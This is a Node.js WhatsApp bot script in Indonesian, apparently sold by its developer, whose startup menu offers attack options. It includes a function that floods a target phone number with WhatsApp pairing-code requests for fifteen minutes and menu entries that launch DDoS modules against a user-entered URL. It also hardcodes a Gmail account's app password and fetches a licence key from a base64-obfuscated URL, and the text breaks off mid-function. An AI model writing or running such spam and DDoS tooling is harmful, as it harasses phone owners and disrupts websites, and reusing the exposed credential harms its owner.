/*
    
     #(Developer) = SkyZet
     #(Type) = Case
        
 ≼≽ Dont Forget To Subscribe Our Channel:
    - https://whatsapp.com/channel/0029Val4Foo4tRrsaZ5jWz09
    
 Ingin Membeli Kebutuhan Bot?
⸙ Contact Developer: 62857888108676

*/

require('./config')
const Config = require("./config")
process.on("uncaughtException", console.error);
const { default: jidNormalizedUser, makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeInMemoryStore, generateWAMessageFromContent, generateWAMessageContent, jidDecode, proto, getContentType, getAggregateVotesInPollMessage, downloadContentFromMessage, fetchLatestWaWebVersion, InteractiveMessage } = require("@whiskeysockets/baileys");
const { exec, spawn, execSync } = require("child_process")
const fs = require("fs");
const pino = require("pino");
const os = require("os")
const chalk = require("chalk")
const axios = require("axios")
const lolcatjs = require('lolcatjs')
const path = require('path')
const NodeCache = require("node-cache");
const msgRetryCounterCache = new NodeCache();
const Spinnies = require('spinnies');
const spinnies = new Spinnies();
const fetch = require("node-fetch")
const FileType = require('file-type')
const _ = require('lodash')
const CFonts = require('cfonts')
const { Boom } = require("@hapi/boom");
const PhoneNumber = require("awesome-phonenumber");
const nodemailer = require('nodemailer')
const moment = require('moment-timezone')
const { formatSize, runtime, sleep, serialize, smsg, color, getBuffer } = require("./function/myfunc")
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
const { toAudio, toPTT, toVideo } = require('./lib/converter')
const { isSetWelcome, getTextSetWelcome } = require('./lib/setwelcome');
const { isSetLeft, getTextSetLeft } = require("./lib/setleft");
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
let set_left_db = JSON.parse(fs.readFileSync("./database/set_left.json"));
let _left = JSON.parse(fs.readFileSync("./database/left.json"));

const low = require('./lib/lowdb');
const yargs = require('yargs/yargs');
const { Low, JSONFile } = low;
const mongoDB = require('./lib/mongoDB');

const opts = yargs(process.argv.slice(2)).exitProcess(false).parse();
const dbPath = './database.json';
let db;
if (urldb !== '') {
db = new mongoDB(urldb);
lolcatjs.fromString("[Berhasil tersambung ke database MongoDB]");
} else {
db = new JSONFile(dbPath);
lolcatjs.fromString("[Berhasil tersambung ke database Lokal]");
}

global.db = new Low(db);
global.DATABASE = global.db;

global.loadDatabase = async function loadDatabase() {
if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }, 1 * 1000));
if (global.db.data !== null) return;

global.db.READ = true;
await global.db.read();
global.db.READ = false;

global.db.data = {
users: {},
chats: {},
database: {},
game: {},
settings: {},
others: {},
sticker: {},
...(global.db.data || {})
};

global.db.chain = _.chain(global.db.data);
};

global.loadDatabase();

process.on('uncaughtException', console.error);

if (global.db && urldb !== '') {
setInterval(async () => {
if (global.db.data) await global.db.write();
}, 30 * 1000);
}


var logoOptions = {
  font: 'tiny',
  align: 'center',
  colors: ['system'],
};

var whatsappOptions = {
  colors: ['yellow'],
  font: 'console',
  align: 'center',
};

function createTmpFolder() {
const folderName = "tmp";
const folderPath = path.join(__dirname, folderName);
if (!fs.existsSync(folderPath)) {
fs.mkdirSync(folderPath);
lolcatjs.fromString(`Folder '${folderName}' berhasil dibuat.`);
} else {
lolcatjs.fromString(`Folder '${folderName}' sudah ada.`);
}
}
createTmpFolder();

const listcolor = ['cyan', 'magenta', 'green', 'yellow', 'blue'];
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)];
const yangBacaHomo = [`
⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿
`, `
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
`, `
⣿⡇⠘⡇⢀⣶⣶⠄⠈⣾⡟⢂⣿⣿⣿⣿⣿⣿⡿⢉⢾⢃⣿⣿⡟⣸⢸⣿⣿⣸
⣿⢸⣦⢧⢸⣿⣿⢱⠄⠄⣇⣼⣿⣿⣿⣿⣿⢟⣼⣿⡯⠸⣿⢳⢱⡏⣼⣿⢇⣿
⡏⣾⢽⣼⢸⣿⣿⡘⣆⢀⠛⣿⣿⣿⣿⡿⣫⣾⣿⣿⢇⣿⠂⢌⡾⡇⣿⡿⢸⣿
⢧⣿⠄⢹⢸⣿⣿⣷⣭⢸⡄⣿⣿⣿⢋⣵⣿⣿⡿⠟⡨⡡⠄⣾⣿⡆⣭⡇⣿⣿
⣼⡏⡀⠄⢀⢿⣿⣿⡟⣾⡇⣿⡿⣡⢁⣿⣿⣫⡶⢃⡵⣡⣿⣮⡻⡇⣿⢸⣮⢿
⣿⡇⣧⢠⠸⡎⡍⡭⢾⡏⣧⢋⢾⠏⣼⣿⣿⠿⣵⣾⣕⠿⣿⣿⣷⢡⠏⣾⣿⣿
⣿⠁⣿⠈⠄⠄⢃⢹⡀⠸⢸⢿⠸⢰⢻⢿⣟⢁⣀⠄⠄⠉⠒⢝⢿⠸⣴⣿⣿⣿
⡍⠇⣿⣷⢰⢰⢸⠄⡃⡆⠈⠈⡀⡌⠠⠸⠃⣿⣏⡳⢷⢄⡀⠄⠄⠰⣿⣿⣿⣿
⡇⠄⠸⣿⢸⣿⣶⡄⣇⠃⡇⡄⡇⠁⠃⠄⠈⢊⠻⠿⣿⣿⣿⣦⠄⠘⣿⣿⣿⣿
⡇⠄⠄⢻⣸⣿⣿⠏⡙⢸⣇⣡⢰⢀⠄⠄⠄⠈⡁⢱⢈⢿⣿⡿⡄⣰⣶⣿⣿⣿
⡇⠄⠄⠄⢻⣿⡿⢰⡇⠆⠲⠶⣝⠾⠸⢴⢠⠄⠇⢸⢸⠄⡶⡜⣽⣿⣿⣿⣿⢏
⠁⠄⠄⠄⠄⢿⡇⠧⢣⣸⣦⣄⣀⠁⠓⢸⣄⠸⢀⠄⡀⡀⡪⣽⣿⣿⢿⣿⢟⣬
⠄⠄⠄⠄⠄⠈⢧⠯⢸⣿⣿⣿⡿⠰⣷⠄⣿⣇⡿⠄⡀⠦⣰⣿⡿⣱⣿⡏⢾⣫
⠄⠄⠄⠄⠄⠄⠈⣌⢌⢿⣿⣿⠇⠼⢃⢠⢇⣻⣧⣿⡡⣸⣿⠿⢁⡟⢁⣳⣿⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠳⢝⣒⣒⠰⣘⣴⡧⠿⣿⣛⡯⣱⡿⣫⢎⣪⣎⣿⣧⢻⠿
`, `
⣿⣯⣿⣟⣟⡼⣿⡼⡿⣷⣿⣿⣿⠽⡟⢋⣿⣿⠘⣼⣷⡟⠻⡿⣷⡼⣝⡿⡾⣿
⣿⣿⣿⣿⢁⣵⡇⡟⠀⣿⣿⣿⠇⠀⡇⣴⣿⣿⣧⣿⣿⡇⠀⢣⣿⣷⣀⡏⢻⣿
⣿⣿⠿⣿⣿⣿⠷⠁⠀⠛⠛⠋⠀⠂⠹⠿⠿⠿⠿⠿⠉⠁⠀⠘⠛⠛⠛⠃⢸⣯
⣿⡇⠀⣄⣀⣀⣈⣁⠈⠉⠃⠀⠀⠀⠀⠀⠀⠀⠀⠠⠎⠈⠀⣀⣁⣀⣀⡠⠈⠉
⣿⣯⣽⡿⢟⡿⠿⠛⠛⠿⣶⣄⠀⠀⠀⠀⠀⠀⠈⢠⣴⣾⠛⠛⠿⠻⠛⠿⣷⣶
⣿⣿⣿⠀⠀⠀⣿⡿⣶⣿⣫⠉⠀⠀⠀⠀⠀⠀⠀⠈⠰⣿⠿⠾⣿⡇⠀⠀⢺⣿
⣿⣿⠻⡀⠀⠀⠙⠏⠒⡻⠃⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠐⡓⢚⠟⠁⠀⠀⡾⢫
⣿⣿⠀⠀⡀⠀⠀⡈⣉⡀⡠⣐⣅⣽⣺⣿⣯⡡⣴⣴⣔⣠⣀⣀⡀⢀⡀⡀⠀⣸
⣿⣿⣷⣿⣟⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⢾⣷⣿
⣿⣿⣟⠫⡾⠟⠫⢾⠯⡻⢟⡽⢶⢿⣿⣿⡛⠕⠎⠻⠝⠪⢖⠝⠟⢫⠾⠜⢿⣿
⣿⣿⣿⠉⠀⠀⠀⠀⠈⠀⠀⠀⠀⣰⣋⣀⣈⣢⠀⠀⠀⠀⠀⠀⠀⠀⠀⣐⢸⣿
⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿
⣿⣿⣿⣿⣦⡔⠀⠀⠀⠀⠀⠀⢻⣿⡿⣿⣿⢽⣿⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿
⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠘⠛⢅⣙⣙⠿⠉⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣅⠀⠓⠀⠀⣀⣠⣴⣺⣿⣿⣿⣿⣿⣿⣿⣿
`, `
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣠⣤⣶⣶⣶⣤⣄⣀⣀⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⣀⣤⣤⣶⣿⣿⣿⣿⣿⣿⣿⣟⢿⣿⣿⣿⣶⣤⡀⠄
⠄⠄⠄⠄⠄⠄⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣜⠿⠿⣿⣿⣧⢓
⠄⠄⠄⠄⠄⡠⢛⣿⣿⣿⡟⣿⣿⣽⣋⠻⢻⣿⣿⣿⣿⡻⣧⡠⣭⣭⣿⡧
⠄⠄⠄⠄⠄⢠⣿⡟⣿⢻⠃⣻⣨⣻⠿⡀⣝⡿⣿⣿⣷⣜⣜⢿⣝⡿⡻⢔
⠄⠄⠄⠄⠄⢸⡟⣷⢿⢈⣚⣓⡡⣻⣿⣶⣬⣛⣓⣉⡻⢿⣎⠢⠻⣴⡾⠫
⠄⠄⠄⠄⠄⢸⠃⢹⡼⢸⣿⣿⣿⣦⣹⣿⣿⣿⠿⠿⠿⠷⣎⡼⠆⣿⠵⣫
⠄⠄⠄⠄⠄⠈⠄⠸⡟⡜⣩⡄⠄⣿⣿⣿⣿⣶⢀⢀⣿⣷⣿⣿⡐⡇⡄⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠁⢶⢻⣧⣖⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣇⡟⣇⣷⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣆⣤⣽⣿⡿⠿⠿⣿⣿⣦⣴⡇⣿⢨⣾⣿⢹⢸
⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⠊⡛⢿⣿⣿⣿⣿⡿⣫⢱⢺⡇⡏⣿⣿⣸⡼
⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⡿⠄⣿⣷⣾⡍⣭⣶⣿⣿⡌⣼⣹⢱⠹⣿⣇⣧
⠄⠄⠄⠄⠄⠄⠄⠄⠄⣼⠁⣤⣭⣭⡌⢁⣼⣿⣿⣿⢹⡇⣭⣤⣶⣤⡝⡼
⠄⣀⠤⡀⠄⠄⠄⠄⠄⡏⣈⡻⡿⠃⢀⣾⣿⣿⣿⡿⡼⠁⣿⣿⣿⡿⢷⢸
⢰⣷⡧⡢⠄⠄⠄⠄⠠⢠⡛⠿⠄⠠⠬⠿⣿⠭⠭⢱⣇⣀⣭⡅⠶⣾⣷⣶
⠈⢿⣿⣧⠄⠄⠄⠄⢀⡛⠿⠄⠄⠄⠄⢠⠃⠄⠄⡜⠄⠄⣤⢀⣶⣮⡍⣴
⠄⠈⣿⣿⡀⠄⠄⠄⢩⣝⠃⠄⠄⢀⡄⡎⠄⠄⠄⠇⠄⠄⠅⣴⣶⣶⠄⣶
`, `
⡏⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠉⠉⠉⠹
⡇⢸⣿⡟⠛⢿⣷⠀⢸⣿⡟⠛⢿⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡇⠀⢸⣿⡇⠀
⡇⢸⣿⣧⣤⣾⠿⠀⢸⣿⣇⣀⣸⡿⠃⢸⣿⡇⠀⢸⣿⡇⢸⣿⣇⣀⣸⣿⡇⠀
⡇⢸⣿⡏⠉⢹⣿⡆⢸⣿⡟⠛⢻⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡏⠉⢹⣿⡇⠀
⡇⢸⣿⣧⣤⣼⡿⠃⢸⣿⡇⠀⢸⣿⡇⠸⣿⣧⣤⣼⡿⠁⢸⣿⡇⠀⢸⣿⡇⠀
⣇⣀⣀⣀⣀⣀⣀⣄⣀⣀⣀⣀⣀⣀⣀⣠⣀⡈⠉⣁⣀⣄⣀⣀⣀⣠⣀⣀⣀⣰
⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷
⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕
⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣
`, `
⠄⣾⣿⡇⢸⣿⣿⣿⠄⠈⣿⣿⣿⣿⠈⣿⡇⢹⣿⣿⣿⡇⡇⢸⣿⣿⡇⣿⣿⣿
⢠⣿⣿⡇⢸⣿⣿⣿⡇⠄⢹⣿⣿⣿⡀⣿⣧⢸⣿⣿⣿⠁⡇⢸⣿⣿⠁⣿⣿⣿
⢸⣿⣿⡇⠸⣿⣿⣿⣿⡄⠈⢿⣿⣿⡇⢸⣿⡀⣿⣿⡿⠸⡇⣸⣿⣿⠄⣿⣿⣿
⢸⣿⡿⠷⠄⠿⠿⠿⠟⠓⠰⠘⠿⣿⣿⡈⣿⡇⢹⡟⠰⠦⠁⠈⠉⠋⠄⠻⢿⣿
⢨⡑⠶⡏⠛⠐⠋⠓⠲⠶⣭⣤⣴⣦⣭⣥⣮⣾⣬⣴⡮⠝⠒⠂⠂⠘⠉⠿⠖⣬
⠈⠉⠄⡀⠄⣀⣀⣀⣀⠈⢛⣿⣿⣿⣿⣿⣿⣿⣿⣟⠁⣀⣤⣤⣠⡀⠄⡀⠈⠁
⠄⠠⣾⡀⣾⣿⣧⣼⣿⡿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣧⣼⣿⣿⢀⣿⡇⠄
⡀⠄⠻⣷⡘⢿⣿⣿⡿⢣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⢿⣿⣿⡿⢃⣾⠟⢁⠈
⢃⢻⣶⣬⣿⣶⣬⣥⣶⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣷⣶⣶⣾⣿⣷⣾⣾⢣
⡄⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠘
⣿⡐⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢠⢃
⣿⣷⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⢀⠆⣼
⣿⣿⣷⡀⠄⠈⠛⢿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⠿⠋⠠⠂⢀⣾⣿
⣿⣿⣿⣧⠄⠄⢵⢠⣈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⡁⢰⠏⠄⠄⣼⣿⣿
⢻⣿⣿⣿⡄⢢⠨⠄⣯⠄⠄⣌⣉⠛⠻⠟⠛⢋⣉⣤⠄⢸⡇⣨⣤⠄⢸⣿⣿⣿
`];
const imageAscii = yangBacaHomo[Math.floor(Math.random() * yangBacaHomo.length)];


const usePairingCode = true

async function startBotz() {
const readline = require("readline");
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
return new Promise((resolve) => {
rl.question(text, resolve)
})
};


const { version, isLatest } = await fetchLatestBaileysVersion();
const resolveMsgBuffer = new NodeCache();
const { state, saveCreds } = await useMultiFileAuthState("session");
    
async function keyoptions(url, options) {
    try {
        const methodskey = await axios({
            method: "GET",
            url: url,
            headers: {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
            },
            ...options
        });
        return methodskey.data;
    } catch (err) {
        return err;
    }
}

const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});

    let systemkey = false;
    if (systemkey === false) {
        let xkey;
        if (global.pw) {
            xkey = global.pw;
        } else {
            console.log(chalk.cyan.bold("Silahkan masukan password disini agar kamu dapat mengakses script ini."));
            xkey = await question(chalk.yellow("Password yang kamu masukin adalah : "));
        }

        setTimeout(async () => {
            const buff = Buffer.from("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NraVpldC96Q0tleS9tYWluL2tleS5qc29u", 'base64').toString("utf-8");
            let mek = await keyoptions(buff);
            if (mek.key !== xkey) {
                const errkey = { text: "Waduh! password yang barusan kamu masukin salah." };
                spinnies.add("spinner-2", errkey);
                setTimeout(() => {
                    spinnies.fail('spinner-2', { text: "Silahkan di coba lagi" });
                }, 1000);
                await sleep(1000);
                systemkey = false;
                process.exit();
            } else {
                spinnies.add("spinner-1", { text: "System sedang mengecek password yang kamu masukin." });
                setTimeout(() => {
                    const succeskey = { text: "Akses Di Berikan" };
                    spinnies.succeed("spinner-1", succeskey);
                }, 1000);
                systemkey = true;
            }
        }, 1000);
       await sleep(3000);
        if (systemkey === false) { false }
        rl.close();
    }
    
const ptz = makeWASocket({
isLatest: true,  // Set the correct value for isLatest
keepAliveIntervalMs: 50000,
printQRInTerminal: true,
logger: pino({ level: "silent" }),
auth: state, // Ensure state is correctly initialized
browser: ["Ubuntu", "Chrome", "20.0.04"],
generateHighQualityLinkPreview: true,
resolveMsgBuffer: true,
});
if (usePairingCode && !ptz.authState.creds.registered) {
  const choice = await question('Pilih metode verifikasi:\n1. Via Gmail\n2. Via Nomor WhatsApp\n3. Spam Pairing Code\n\nDDOS\n\n4. DDoS-Lol\n5. DDoS-Mix\nPilihan Anda: ');

  if (choice === '1') {
    const email = await question('Masukkan Alamat Email Anda:\n');
    await requestPairingAndSendEmail(email);
  } else if (choice === '2') {
    console.log(`Is connecting Number ${global.pairing}\n`);
    const code = await ptz.requestPairingCode(global.pairing);
    console.log('Process...');
    await sleep(3000); // Tunggu selama 3000 milidetik
    console.log(`Your Pairing Code: ${code}`);
  } else if (choice === '3') {
    await spamPairingRequest();
  } else if (choice === '4') {
    const linktarget = await question('Enter Url Target:\n')
    await targetddos(linktarget)
  } else if (choice === '5') {
    const linkurl = await question('Enter Url Target:\n')
    await targetddos_mix(linkurl)
  } else {
    console.log('Pilihan tidak valid.');
  }
}

async function requestPairingAndSendEmail(email) {
  try {
    await new Promise((resolve) => setTimeout(resolve, Config.pairing_wait));
    const code = await ptz.requestPairingCode(global.pairing);

    async function sendVerificationEmail(email, code) {
      try {
        const transporter = nodemailer.createTransport({
          service: 'gmail',
          host: 'smtp.gmail.com',
          port: 587,
          secure: false,
          auth: {
            user: 'kyuurzy',  // Use environment variables
            pass: 'whegpmrqjvrfoqog',  // Use environment variables
          },
        });

        const mailOptions = {
          from: 'kyuurzy@gmail.com',
          to: email,
          subject: 'Verification',
          html: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Request Pairing Code</title>
</head>
<body>
  <div style="border: 1px solid #ccc; padding: 20px; font-family: monospace;">
    <div style="background-color: rgba(255, 255, 255, 0.7); padding: 20px; border-radius: 10px">
       <h2 style="color: #00000">Request Pairing Code</h2>
       <p>Dear ${email},</p>
       <p>Thank you for using this WhatsApp bot. Here is your pairing code:</p>
       <div style="background-color: #e5e5e5; padding: 10px; text-align: center; font-size: 18px; font-weight: bold">
         <div style="text-align: center; font-family: monospace;">
           ${code}
         </div>
         <hr style="display: inline-block; margin-top: 20px; margin-bottom: 20px; width: 60%;">
         <p style="font-size: 12px; display: inline-block;">Notification Request Pairing Code, Harap Masukkan Kode Pairing Untuk Dapat Terhubung Di Bot WhatsApp</p>
         <p style="font-size: 12px; display: inline-block;">Time Limit for Request Pairing Code: 30 seconds!!!</p>
       </div>
    </div>
  </div>
</body>
</html>`,
        };

        await transporter.sendMail(mailOptions);
        console.log('Silahkan periksa Gmail Anda.');
      } catch (error) {
        console.error('Terjadi kesalahan saat mengirim email:', error);
      }
    }

    await sendVerificationEmail(email, code);
  } catch (error) {
    console.error('Terjadi kesalahan saat meminta kode verifikasi:', error);
  }
}

async function spamPairingRequest() {
  const startTime = Date.now();
  const duration = 15 * 60 * 1000; // 15 menit dalam milidetik
  const phoneNumber = await question('Masukkan Nomor WhatsApp Target:\n');

  // Sanitasi nomor telepon
  const sanitizedPhoneNumber = phoneNumber.replace(/[^0-9]/g, '');

  while (Date.now() - startTime < duration) {
    let attempts = 100; // Jumlah percobaan per iterasi
    while (attempts > 0) {
      try {
        const pairingCodeResponse = await ptz.requestPairingCode(sanitizedPhoneNumber);
        console.log(`Spam On Target: ${pairingCodeResponse}`);
      } catch (error) {
        console.error('Terjadi kesalahan saat meminta kode verifikasi:', error);
      }

      console.log(`DDOS WhatsApp: ${attempts} detik...`);
      await new Promise(resolve => setTimeout(resolve, 1000)); // 1 detik per iterasi
      attempts--;
    }

    console.log('Mengirim Ulang Dalam 30 detik...');
    await new Promise(resolve => setTimeout(resolve, 30000)); // Tunggu 30 detik sebelum iterasi berikutnya
  }

  console.log('Selesai. 15 menit telah berlalu.');
}

async function targetddos(linktarget) {
let ddosin = require("./lib/lol.js")
ddosin(linktarget)
exec(`node ./lib/lol.js`, (err, stdout) => {
